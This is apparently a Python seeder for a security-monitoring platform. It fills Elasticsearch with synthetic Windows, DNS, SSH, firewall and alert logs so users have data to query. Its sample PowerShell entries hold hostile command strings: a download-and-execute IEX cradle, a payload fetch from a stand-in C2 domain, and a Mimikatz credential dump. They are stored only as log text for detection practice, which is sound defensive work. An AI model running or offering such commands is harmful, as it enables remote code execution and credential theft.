"""
CyberSentinel v3.0 - ELK Log Seeder (Phase 3)
Seeds Elasticsearch with realistic security logs so users have real data to query.
Runs on backend startup. Auto-detects if already seeded.
"""
import json
import random
import httpx
from datetime import datetime, timedelta
from app.core.config import settings
from app.core.logging import get_logger

logger = get_logger(__name__)

INTERNAL_IPS = ["10.0.1.15", "10.0.1.22", "10.0.1.50", "10.0.1.101", "10.0.2.5", "10.0.2.30", "192.168.1.10", "192.168.1.25"]
EXTERNAL_IPS = ["45.33.32.156", "185.220.101.33", "91.240.118.172", "103.75.201.44", "162.247.74.27", "198.51.100.23"]
USERNAMES = ["admin", "jdoe", "ssmith", "mwilson", "root", "svc_backup", "administrator", "guest"]
HOSTNAMES = ["DC01", "WEB01", "WEB02", "DB01", "FILE01", "MAIL01", "WKSTN-101", "WKSTN-102", "LINUX-WEB01"]
DOMAINS_SUS = ["evil-c2.xyz", "malware-drop.ru", "phishing-kit.cn", "data-exfil.tk", "cryptominer.cc"]
DOMAINS_GOOD = ["google.com", "microsoft.com", "github.com", "aws.amazon.com", "office365.com"]
PROCESSES = ["powershell.exe", "cmd.exe", "svchost.exe", "notepad.exe", "chrome.exe", "mimikatz.exe", "psexec.exe", "wmic.exe", "net.exe"]

def _ts(hours_back=72):
    return (datetime.utcnow() - timedelta(hours=random.uniform(0, hours_back))).isoformat() + "Z"

def gen_failed_login():
    return {"@timestamp": _ts(), "event": {"code": "4625", "category": "authentication", "outcome": "failure", "action": "logon-failed"}, "winlog": {"event_id": "4625", "channel": "Security"}, "source": {"ip": random.choice(EXTERNAL_IPS)}, "user": {"name": random.choice(USERNAMES)}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"Failed logon from {random.choice(EXTERNAL_IPS)}", "agent": {"type": "winlogbeat"}}

def gen_success_login():
    lt = random.choice(["2", "3", "3", "3", "10"])
    return {"@timestamp": _ts(), "event": {"code": "4624", "category": "authentication", "outcome": "success"}, "winlog": {"event_id": "4624", "event_data": {"LogonType": lt}}, "source": {"ip": random.choice(INTERNAL_IPS)}, "user": {"name": random.choice(USERNAMES[:4])}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"Successful logon Type {lt}", "agent": {"type": "winlogbeat"}}

def gen_explicit_creds():
    return {"@timestamp": _ts(24), "event": {"code": "4648", "category": "authentication", "action": "explicit-credential-logon"}, "winlog": {"event_id": "4648"}, "source": {"ip": random.choice(INTERNAL_IPS)}, "destination": {"ip": random.choice(INTERNAL_IPS)}, "user": {"name": random.choice(USERNAMES[:3])}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"Explicit credentials used by {random.choice(USERNAMES[:3])}", "agent": {"type": "winlogbeat"}}

def gen_process():
    p = random.choice(PROCESSES)
    return {"@timestamp": _ts(), "event": {"code": "1", "category": "process", "action": "Process Create"}, "process": {"name": p, "command_line": f"{p} -enc base64..." if p == "powershell.exe" else p, "parent": {"name": "cmd.exe"}}, "user": {"name": random.choice(USERNAMES[:3])}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"Process: {p}", "agent": {"type": "winlogbeat"}}

def gen_powershell():
    scripts = ["Get-Process", "Invoke-WebRequest -Uri http://evil-c2.xyz/payload.exe", "Import-Module ActiveDirectory; Get-ADUser -Filter *", "IEX(New-Object Net.WebClient).DownloadString('http://malware.tk/shell')", "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'", "Get-WmiObject Win32_LogicalDisk"]
    s = random.choice(scripts)
    return {"@timestamp": _ts(), "event": {"code": "4104", "category": "process"}, "winlog": {"event_id": "4104"}, "powershell": {"script_block_text": s}, "process": {"name": "powershell.exe"}, "user": {"name": random.choice(USERNAMES[:3])}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"PS: {s[:80]}", "agent": {"type": "winlogbeat"}}

def gen_dns():
    mal = random.random() < 0.15
    d = random.choice(DOMAINS_SUS) if mal else random.choice(DOMAINS_GOOD)
    return {"@timestamp": _ts(), "event": {"category": "dns"}, "dns": {"question": {"name": d, "type": "A"}}, "source": {"ip": random.choice(INTERNAL_IPS)}, "host": {"name": random.choice(HOSTNAMES)}, "message": f"DNS: {d}", "agent": {"type": "packetbeat"}}

def gen_linux_auth():
    fail = random.random() < 0.4
    src = random.choice(EXTERNAL_IPS)
    u = random.choice(USERNAMES)
    return {"@timestamp": _ts(), "event": {"category": "authentication", "outcome": "failure" if fail else "success"}, "source": {"ip": src}, "user": {"name": u}, "host": {"name": "LINUX-WEB01"}, "process": {"name": "sshd"}, "message": f"{'Failed' if fail else 'Accepted'} password for {u} from {src}", "agent": {"type": "filebeat"}}

def gen_firewall():
    act = random.choice(["allow", "allow", "deny"])
    port = random.choice([22, 80, 443, 445, 3389, 8080])
    return {"@timestamp": _ts(), "event": {"category": "network", "action": act}, "source": {"ip": random.choice(EXTERNAL_IPS), "port": random.randint(40000, 65000)}, "destination": {"ip": random.choice(INTERNAL_IPS), "port": port}, "message": f"FW {act} port {port}", "agent": {"type": "filebeat"}}

def gen_alert():
    alerts = [
        {"rule": "Brute Force Attack", "sev": "high", "score": 75},
        {"rule": "Suspicious PowerShell", "sev": "critical", "score": 90},
        {"rule": "Lateral Movement PsExec", "sev": "critical", "score": 95},
        {"rule": "Credential Dumping", "sev": "critical", "score": 98},
        {"rule": "C2 Beacon Detected", "sev": "high", "score": 85},
        {"rule": "Ransomware Encryption", "sev": "critical", "score": 99},
    ]
    a = random.choice(alerts)
    return {"@timestamp": _ts(48), "event": {"category": "threat", "severity": a["sev"], "risk_score": a["score"]}, "signal": {"rule": {"name": a["rule"], "severity": a["sev"]}}, "kibana": {"alert": {"severity": a["sev"]}}, "source": {"ip": random.choice(EXTERNAL_IPS)}, "host": {"name": random.choice(HOSTNAMES)}, "user": {"name": random.choice(USERNAMES[:4])}, "message": f"Alert: {a['rule']}", "agent": {"type": "elastic-agent"}}

SEED_PLAN = [
    ("winlogbeat-cybersentinel", gen_failed_login, 80),
    ("winlogbeat-cybersentinel", gen_success_login, 100),
    ("winlogbeat-cybersentinel", gen_explicit_creds, 25),
    ("winlogbeat-cybersentinel", gen_process, 60),
    ("winlogbeat-cybersentinel", gen_powershell, 40),
    ("packetbeat-cybersentinel", gen_dns, 80),
    ("filebeat-cybersentinel", gen_linux_auth, 50),
    ("filebeat-cybersentinel", gen_firewall, 40),
    ("security-alerts-cybersentinel", gen_alert, 30),
]

async def seed_elk_logs():
    base_url = getattr(settings, 'elasticsearch_url', None) or "http://elasticsearch:9200"
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as c:
            r = await c.get(f"{base_url}/_cluster/health")
            if r.status_code != 200:
                logger.warning(f"ES not ready: {r.status_code}")
                return
    except Exception as e:
        logger.warning(f"ES not reachable: {e}")
        return

    # Check if already seeded
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as c:
            r = await c.get(f"{base_url}/winlogbeat-cybersentinel/_count")
            if r.status_code == 200 and r.json().get("count", 0) > 50:
                logger.info(f"Already seeded ({r.json()['count']} events). Skip.")
                return
    except Exception:
        pass

    logger.info("Seeding ~505 security events...")
    total = 0
    for idx, gen, count in SEED_PLAN:
        lines = []
        for _ in range(count):
            ev = gen()
            lines.append(json.dumps({"index": {"_index": idx}}))
            lines.append(json.dumps(ev))
        body = "\n".join(lines) + "\n"
        try:
            async with httpx.AsyncClient(timeout=30, verify=False) as c:
                r = await c.post(f"{base_url}/_bulk", content=body, headers={"Content-Type": "application/x-ndjson"})
                if r.status_code == 200:
                    total += count
                    logger.info(f"{idx}: {count} events")
        except Exception as e:
            logger.error(f"{idx} error: {e}")

    logger.info(f"{total} events seeded")

def generate_sample_events(count: int = 300) -> list[dict]:
    """Generate N realistic sample security events for bulk ingestion."""
    generators = [gen_failed_login, gen_success_login, gen_explicit_creds, gen_process,
                  gen_powershell, gen_dns, gen_linux_auth, gen_firewall, gen_alert]
    return [random.choice(generators)() for _ in range(count)]

def main():
    import asyncio
    asyncio.run(seed_elk_logs())
